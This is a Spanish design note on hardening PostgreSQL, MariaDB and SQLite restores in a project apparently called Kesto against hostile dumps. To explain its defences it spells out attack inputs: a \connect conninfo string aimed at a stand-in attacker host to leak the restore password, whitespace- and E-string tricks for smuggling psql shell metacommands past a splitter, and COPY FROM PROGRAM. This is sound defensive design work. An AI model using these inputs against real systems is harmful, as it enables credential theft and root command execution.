# Design — endurecimiento de la restauración

Issue **#164 (SEC-08)**, bloque C de la campaña. Las decisiones que sostienen la propuesta, con las alternativas que se descartaron y el porqué.

## D0 — La frontera de confianza

El volcado sale de un repositorio S3 **configurable por el operador**, con credenciales que el operador elige. La restauración exige un `snapshot_id` vinculado a una `job_execution`, lo que impide restaurar la instantánea de un repositorio ajeno, pero no impide que el **repositorio propio** esté comprometido o sustituido. Dentro de esa frontera, el contenido es **no confiable** y se entrega a un intérprete que corre como `root` en el contenedor destino. Este bloque trata ese contenido como hostil.

## D1 — Tres clientes, tres mecanismos

| Cliente | Mecanismo nativo | Corta | ¿Rompe algo legítimo? |
|---|---|---|---|
| `sqlite3` | `-safe` | `.shell`, `.system`, `.read`, `.import`, `.output`, `.once`, `ATTACH`, `load_extension()` | No (verificado ida y vuelta) |
| `mariadb` | `--binary-mode` | Todo comando de cliente salvo `\C` y `DELIMITER` | No (verificado) |
| `psql` | `\restrict <clave>` | Todo metacomando salvo `\unrestrict` | **Sí**: bloquea `\connect` |

Donde el cliente ya trae un modo, se usa el suyo; no se reimplementa en Kesto lo que el propio intérprete sabe ignorar.

## D2 — SQLite: `-safe`

`-safe` es un modo del propio `sqlite3`. Verificado: corta los ocho vectores citados, permite `PRAGMA`, `ATTACH` **no**, y una restauración de un `.dump` real produce el mismo fichero. Alternativa descartada: filtrar el `.dump` en Kesto —duplicar el lexer de SQLite para nada—.

Requisito de versión: `-safe` existe desde SQLite 3.27. Un `sqlite3` que no lo soporte rechaza la opción y la orden falla —**fail-closed**—, y ese fallo SHALL quedar registrado con el error del contenedor, no silenciado.

## D3 — PostgreSQL: por qué hay que trocear

`pg_dumpall` separa las bases con metacomandos `\connect <base>` (verificado). `\restrict` **bloquea `\connect`** —«backslash commands are restricted; only \unrestrict is allowed»—, así que anteponer `\restrict` a un volcado global **desvía los datos a la base equivocada**: verificado que las filas de `uno` acaban en `postgres`. Por eso hay que trocear y restaurar base por base.

Alternativas descartadas:

- **No trocear y confiar en el `\restrict` del propio volcado.** El volcado lo controla quien lo escribió: puede omitir el `\restrict` o deshacerlo con su propia clave. No es una guarda.
- **Cambiar el volcado a formato custom (`pg_dump -Fc`) y restaurar con `pg_restore`.** `pg_restore` lee un archivo binario y no interpreta metacomandos: sería inmune **por construcción** y evitaría el troceador. Pero cambia el formato almacenado, deja de restaurarse lo ya guardado y sale del alcance de la extracción. Se descarta en este bloque y se anota como mejora posible.

## D4 — El troceador: reconocer comillas, dólares y `COPY`

Un `\connect` a primer nivel es una frontera; uno dentro de un literal no. Verificado:

- un valor de tabla `\connect otra` en un `COPY` sale **escapado** (`\\connect otra`), así que los datos de `COPY` no colisionan;
- un `\connect` dentro de un cuerpo de función (dólar o comilla multilínea) sale **literal al inicio de línea**, y `psql` **no** lo interpreta como metacomando (es consciente de las comillas).

Un troceador que partiese por `^\connect` **rompería un volcado legítimo**. Por eso el troceador SHALL rastrear el estado léxico: comilla simple (`''`), comilla doble (`""`), dólar (`$tag$`), comentario de línea (`--`), comentario de bloque (`/* */`, anidable) y bloque `COPY` (de `COPY … FROM stdin;` al `\.`). Es el subconjunto de `psqlscan` que decide dónde empieza una línea de metacomando. Vive en un módulo **puro** —sin contenedores, sin red— y se prueba con los casos límite de arriba.

**Otro borde, éste de seguridad (verificado).** El literal con prefijo `E` escapa la comilla con barra invertida: en `E'escapada \' aqui` + `\connect a2` + `'`, el `psql` **no** ve un metacomando —imprime el texto entero, con el `\connect` dentro—, pero un troceador que cerrara el literal en `\'` vería un `\connect` de primer nivel y **desviaría el resto de la sección a otra base**. No es una rareza de fidelidad: lo escribe quien controla el repositorio, así que es un vector para romper la restauración por base. El troceador SHALL tratar `E'…'` con la regla del cliente: la barra invertida escapa el carácter siguiente.

**El juego de blancos es el de `psql`, completo (verificado).** El cliente salta `[ \t\n\r\f\v]` —espacio, tabulador, salto, retorno, avance de página y tabulador vertical— antes de un metacomando: `\f\!`, `\v\!` y `\r\!` **ejecutan**. Un descarte que solo mirara espacio y tabulador los dejaría pasar como contenido. Así que «primer byte no blanco» usa ese juego completo, y no solo `[ \t]`.

**El bloque `COPY … FROM stdin` se reconoce como lo reconoce `psql`, no por subcadena (verificado).** El cliente registra la **letra inicial de los primeros identificadores de primer nivel** de la sentencia —con el tope de ocho, y sin registrar los de dentro de paréntesis— y decide si entra en modo `COPY` cuando la sentencia **termina**, al ver el `;` a profundidad de paréntesis cero. Un troceador que buscara la subcadena daría **falsos positivos** —`COPY nope TO STDOUT; -- FROM stdin` y `COPY (SELECT 1 FROM stdin_x) TO STDOUT;` **no** entran en modo `COPY`, pero la subcadena sí— y se quedaría en él hasta un `\.` que puede no llegar, tragándose las fronteras siguientes y desviando los datos a la base equivocada; y **falsos negativos** con una cabecera partida en dos líneas (`COPY t (a)\nFROM stdin;` sí abre `COPY` en el cliente), cuyas líneas de datos que empiezan por `\` se descartarían o se tomarían por frontera.

**El nombre del `\connect` tiene bordes que hay que respetar.** `\c` es **alias real** de `\connect` (verificado), así que reconocer solo `connect` perdería una frontera legítima; pero la palabra tiene que terminar ahí —`\connectx`, `\cd`, `\conninfo`, `\copy` **no** lo son—. Y `\connect` **sin nombre** reconecta a la **misma** base (verificado), así que **no** es una frontera: tratarlo como tal abriría una sección hacia la base por defecto de `psql -d ""`, que diverge del cliente. Dentro de un nombre entrecomillado, `""` es una comilla escapada (`\connect "a""b"` conecta a `a"b`), y la etiqueta de un dólar admite el juego no ASCII de `psql` (`$café$…$café$`), o el `\connect` que llevara dentro se tomaría por frontera.

**El residuo aceptado.** El troceador procesa **una línea** cada vez y no materializa el volcado, así que la memoria no crece con el tamaño total; pero el búfer que acumula hasta el `\n` **sí** es de la línea en curso. Un volcado con una línea gigante sin terminador la acumularía entera. Se acepta: su sitio es un tope por línea, no este módulo, y aquí solo se deja dicho.

**Un borde que hay que cerrar (verificado).** El metacomando **no** tiene que empezar en la columna cero: `psql` lo ejecuta igual precedido de espacios o de un tabulador —`   \! echo …` y `\t\! echo …` ejecutan, y `   \connect zz` conecta de verdad—. Un descarte que exigiera la barra en la columna cero sería **evadible con un espacio**. Así que «primer nivel» significa **primer byte no blanco de la línea**, y una barra invertida como primer byte no blanco fuera de literal/comentario/`COPY` es siempre un metacomando: fuera de esos estados, `\` no es un comienzo de token SQL válido, así que descartar la línea no pierde SQL legítimo.

## D5 — Ignorar metacomandos, con `\restrict` como segunda capa **obligatoria**

Dos capas, en este orden:

1. **Ignorar** (descartar) toda línea de metacomando de primer nivel de cada sección, conservando el terminador `\.` de los bloques `COPY`. Es la guarda **principal**: sin metacomandos que entregar, no hay nada que ejecutar, y no depende de la versión del cliente. Es, literalmente, el «modo de importación que ignore metacomandos» del issue. Y descarta también el `\unrestrict` que un volcado hostil pudiera traer: el atacante no puede deshacer la capa 2 porque su propia línea de desbloqueo es, para el troceador, un metacomando más.
2. Anteponer `\restrict <nonce>` a cada sección, con un `nonce` aleatorio por restauración. Es una guarda **de segunda línea**: si el troceador dejara escapar un metacomando, `psql` lo rechazaría. El `nonce` se genera con `rand` —ya es dependencia— y **no** se deriva de nada del volcado.

**La capa 2 es una precondición de ejecución, no un adorno.** `\restrict` exige `psql` 17.6, o el mínimo de su rama (16.10, 15.14, 14.19, 13.22); PostgreSQL 18 lo trae de serie. Antes de leer una sola línea del volcado, la restauración ejecuta `psql --version` con el **mismo binario** que usará el reparto —sin credencial, porque `--version` no conecta— y, si el cliente no lo honra, **falla** con un motivo que nombra el contenedor, la versión leída y el mínimo, y **no restaura nada**.

El porqué de fallar en vez de degradarse: la capa 1 es *código nuestro*, y un fallo suyo —un borde léxico que no se reconozca— no se ve venir. La capa 2 es la red que convierte ese fallo en un rechazo del cliente. Sin ella, un `psql` que sí ejecuta el metacomando —verificado que los que van precedidos de `\f`, `\v` o `\r` se le escapan a un troceador que solo mirara espacio y tabulador— lo correría como `root` en el contenedor destino. «La capa 1 sigue en pie» es precisamente lo que **no** se puede afirmar de un cliente que no honra `\restrict`: la batería de pruebas lo verifica a mano, no en producción. Así que donde no esté, la restauración **no se ejecuta**.

## D5b — El nombre de base del `\connect` sale del volcado (verificado)

La base de cada sección no la elige el operador: la escribe el `\connect` **del volcado**, que es contenido no confiable, y acaba en `psql -d <base>`. Lo comprobé por si fuera una inyección de opciones y **no lo es**: `psql` consume el argumento de `-d` aunque empiece por guion —`psql -d -c "select 1"` busca una base llamada `-c` («database "-c" does not exist») y `-d --help` una llamada `--help`—, así que el nombre viaja como **valor** y nunca como opción. Se deja escrito en la spec con su escenario para que nadie lo «simplifique» a un argumento suelto. Eso cierra la **inyección de opciones**, y nada más: el vector de la **cadena de conexión** que aparece en la segunda revisión se cierra en D5c.

Dos bordes que sí aparecen y se aceptan:

- **Nombre de base vacío** (`\connect` sin nombre): `psql -d ""` cae en la base por defecto del usuario. No se rechaza porque no aporta nada al atacante —puede nombrar `postgres` explícitamente si quiere ese destino—, y rechazarlo arriesgaría romper un volcado legítimo y exótico. Se documenta en vez de convertirlo en guarda.
- **Nombre con un byte nulo**: la conversión a `argv` del `exec` no lo admite y la orden falla; es *fail-closed* por construcción, no hace falta una guarda.

## D5c — El nombre de base del `\connect` **no** puede tener forma de cadena de conexión

D5b dejó dicho que el nombre viaja como **valor** de `-d` y nunca como opción, y eso es cierto; pero **no** cierra el vector. `psql -d <valor>` lee el valor como *conninfo* —y de ahí saca `host`, `port`, `user`, `dbname`, `sslmode`…— si **contiene un `=`** o si es una URI con el esquema `postgres://` o `postgresql://`, que son los dos que reconoce libpq. Verificado contra `psql` 18.6: `psql -d "host=127.0.0.1 port=1 dbname=x"` y `psql -d 'postgresql://127.0.0.1:1/x'` intentan conectar a `127.0.0.1`, puerto 1, en vez de buscar una base con ese nombre. Un volcado hostil con `\connect "host=atacante.example dbname=postgres"` —que el troceador acepta también sin comillas— compondría `psql -X -U operador -d "host=atacante.example dbname=postgres"`: **conexión al servidor del atacante con `PGPASSWORD` en el entorno**, o sea fuga de la credencial y una «restauración» que escribe donde no debe. Es preexistente al endurecimiento, pero el bloque dice neutralizar el `\connect` del volcado y esto no lo cerraba.

**Se rechaza, fail-closed.** El predicado es puro —`parece_cadena_de_conexion`, verdadero si contiene un `=` o si empieza por `postgres://`/`postgresql://` sin distinguir mayúsculas— y la comprobación va **antes** de componer y ejecutar la orden de la sección: si la base de una sección sale de un `\connect` y tiene esa forma, la restauración **falla** sin ejecutar esa sección ni las siguientes. La `base_inicial` —el `db_name` del target o `postgres`— **no** se valida: la elige el operador en la configuración del target, no viene del volcado. El motivo nombra el contenedor y la forma del nombre, y **no** el valor: es contenido no confiable —saltos de línea y escapes ANSI dentro— y `error_message` lo muestra en el panel.

**Por qué no pasarlo por `PGDATABASE`** (la alternativa que parecía elegante): medido en local, `PGDATABASE="host=… port=…"` **no** expande —`psql` conecta por el socket local—, así que en la práctica bastaría. Pero la documentación de libpq dice que un `dbname` **con un `=`** es una cadena de conexión, así que apoyarse en el comportamiento observado sería depender de un detalle que libpq no promete: el día que unificara los dos caminos, el vector volvería en silencio. Y el precio de rechazar es bajo y se acepta: PostgreSQL admite un `=` dentro de un identificador entrecomillado, así que un volcado de una base llamada literalmente así —o que empiece por `postgres://`— se rechazaría; son nombres exóticos, y la restauración falla **en voz alta** nombrando el `\connect` del volcado, no en silencio.

**Nota aparte: `ON_ERROR_STOP` se aplaza (#175).** `psql` **sin** `ON_ERROR_STOP` sale con `0` ante un error de SQL, así que los errores **dentro** de una sección **no** se detectan hoy: una sección cuyas sentencias fallaron se da por buena. La garantía que el código da de verdad es la que se puede comprobar en él —se falla cuando una orden sale con un código distinto de cero—, y así queda escrita en la doc de `ejecutar_por_secciones`. Detectar los errores de SQL de dentro de una sección es una decisión de política de restauración —¿aborta la restauración entera ante la primera sentencia que falle?— y va por su cuenta: **issue #175**.

## D6 — `COPY … FROM PROGRAM`: residual aceptado

`COPY t FROM PROGRAM '…'` es SQL, no un metacomando: `psql` no lo ve como tal y `\restrict` **no lo corta** (verificado: ejecuta). Exige superusuario —o el rol `pg_execute_server_program`— en el servidor destino. Los targets de Kesto suelen usar un usuario administrador, así que el vector es real, pero NO SHALL cortarse recortando privilegios que la restauración necesita (crear bases, roles, extensiones). Se acepta y se documenta en la frontera de confianza; su sitio natural es la separación de privilegio del motor (**#173**).

## D7 — Streaming por secciones, sin materializar el volcado

La restauración de PostgreSQL pasa de **un** `exec` con el volcado por el `stdin` a **una orden por sección**, cada una con su `stdin`. El volcado NO SHALL materializarse: las secciones se leen del túnel que ya trae el volcado del repositorio y se entregan al `stdin` de cada `psql` conforme se identifican, con la memoria acotada al búfer del túnel y a la línea en curso. La primera sección va a `db_name` o, si es nulo, a `postgres`; cada `\connect <base>` abre la sección de esa base.

**Modelo.** Hoy `CaminoDeRestauracion::PorContenedor` lleva `ordenes: Vec<Orden>` y `ejecutar_las_ordenes` entrega el volcado **a la última**. Eso no da para N destinos, así que la variante gana un campo `reparto`:

- `Reparto::ALaUltimaOrden` — lo de hoy: `mariadb` (una orden) y `sqlite` (retirar y reimportar, el volcado a la última).
- `Reparto::PorSeccionesDePostgres { plantilla, base_inicial }` — la plantilla es una `Orden` con el `cmd` `psql -X -U <usuario> -d` **sin base** y el entorno con `PGPASSWORD`; cada sección la completa añadiendo su base. Guardar la plantilla como `Orden` —y no como `Vec<String>` + entorno suelto— es deliberado: el `Debug` de `Orden` ya publica los **nombres** de las variables y nunca sus valores, así que el reparto hereda esa garantía y la contraseña no se filtra en un `{:?}`.

Las bases no se conocen hasta que se lee el volcado, así que las órdenes de las secciones se construyen **sobre la marcha**, al vuelo, desde la plantilla. `ejecutar_las_ordenes` pasa a despachar según el `reparto`: en `ALaUltimaOrden` mantiene el `split_last` de hoy, y en `PorSeccionesDePostgres` ejecuta la primera sección contra `base_inicial` y una por cada frontera.

**Alternativa descartada:** que `comando()` devolviera ya la lista de órdenes. No puede: las bases están dentro del volcado, y `comando()` no lo lee —es puro y no toca E/S—. Meter la lectura del volcado en `comando()` rompería esa separación y arrastraría la credencial a un sitio donde hoy no está.

## D8 — Lo que NO cambia

- El esquema, el contrato HTTP de los targets y la confirmación de sobrescritura.
- La guarda de «dos restauraciones sobre el mismo destino» y el confinamiento del bloque B.
- El formato de los volcados y la extracción.

## D9 — Alternativas descartadas (resumen)

- Filtrar en Kesto lo que el cliente ya sabe ignorar (`-safe`, `--binary-mode`).
- Cambiar el formato del volcado a custom (D3).
- Confiar en el `\restrict` del propio volcado (D3).
- Partir por `^\connect` sin reconocer comillas (D4).
- **Degradarse en silencio cuando el `psql` no honra `\restrict`** (D5). Descartada: la capa 1 es código nuestro y su fallo no se ve venir; sin la capa 2, un metacomando que se le escape al troceador se ejecuta como `root` en el contenedor destino. «La capa 1 sigue en pie» es una afirmación que solo se puede hacer con un cliente que honre `\restrict`, no una garantía de producción. Por eso la restauración falla.
- Bloquear `COPY … FROM PROGRAM` (D6).
